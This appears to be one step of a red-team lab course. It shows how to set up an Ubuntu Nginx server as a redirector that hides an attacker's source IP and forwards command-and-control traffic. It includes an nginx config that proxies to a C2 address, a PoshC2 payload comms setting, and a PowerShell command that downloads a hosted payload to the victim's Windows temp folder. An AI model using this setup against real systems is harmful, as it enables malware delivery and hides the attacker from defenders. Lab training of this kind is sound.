# Setting up proxy using Ubunut and Nginx

When running actions as an actor you always want to avoid giving away where you are coming from or your source ip. Typically this is done with a proxy also sometimes known as a LP (listening post), in this case it will be an ubuntu server running Nginx. Your current setup is as follows: 

	parrot-OS <> Victim VM
  
What we will be doing with the Ubuntu server is routing our C2 traffic through it so it appears it as though it is coming from the Ubuntu server and the the Parrot vm.

<img src="/images/basic-redirector.png" alt="Markdown Monster icon" style="float: left; margin-right: 10px;" />

Lets install any Ubuntu server ISO from the interwebs [here](https://ubuntu.com/download/server).

# Install Nginx

1. First on your new ubntu box lets run an update 
	```
	sudo apt update
	```
2. Now lets install nginx
	```
	sudo apt install nginx
	```
3. Check the status of our new service 
	```
	sudo systemctl status nginx.service
	```
4. Note the following as important file location for Ngnix 
	## Important Nginx File Locations 
	- `/var/www/html` – Website content as seen by visitors.
	- `/etc/nginx` – Location of the main Nginx application files.
	- `/etc/nginx/nginx.conf` – The main Nginx configuration file.
	- `/etc/nginx/sites-available` – List of all websites configured through Nginx.
	- `/etc/nginx/sites-enabled` – List of websites actively being served by Nginx.
	- `/var/log/nginx/access.log` – Access logs tracking every request to your server.
	- `/var/log/ngins/error.log` – A log of any errors generated in Nginx.


# Nginx Reverse Proxy Config 

1. If your Nginx service isnt already running, run the following command
	```
	sudo systemctl start nginx.service
	```
2. lets edit our default config file `/etc/nginx/sites-enabled/default`
	```
	sudo vim /etc/nginx/site-enabled/default
	```
3. Add the following changes
	```nginx
	server {
			listen 80 default_server;
			listen [::]:80 default_server;

			root /var/www/html;

			index index.html;

			server_name *.example.org;

			location / {
					try_files $uri $uri/ @c2;
			}

			location @c2 {
					proxy_pass http://c2-ip-address;
					proxy_redirect off;
					proxy_set_header Host $host;
					proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			}
	}
	```
> **NOTE:** Set your listening ports for Nginx server and your C2 ip to redirect to.

4. test your config 
    ```bash
    sudo nginx -t
    ```
5. If no error, restart you Nginx server
    ```bs
    sudo systemctl restart nginx.service
    ```
6. Before we get a beacon on our victim using our proxy you HAVE to start a new posh-project and change the followin
	```
	Payloadcoms http://nginx-ip:80
	```	
7. Once your new posh-project is up all you need is to host a new payload and you'll be ready for compromise 
	
8. Now you can return to your Victim Machine and run a download using powershell through your proxy 
	```powershell 
	iwr -uri http://<ubuntu-nginx-ip>/hosted-payload -outfile C:\windows\temp\gotem.exe
	```
## [Return to course page](README.md) or [Continue Course](step3-persistence.md) 

# Resources
- [How to setup NGINX server on ubuntu](https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04)
  - > This writeup was made following this if you need a better explination
- [Something forwarding C2 coms](https://coffeegist.com/security/resilient-red-team-https-redirection-using-nginx/)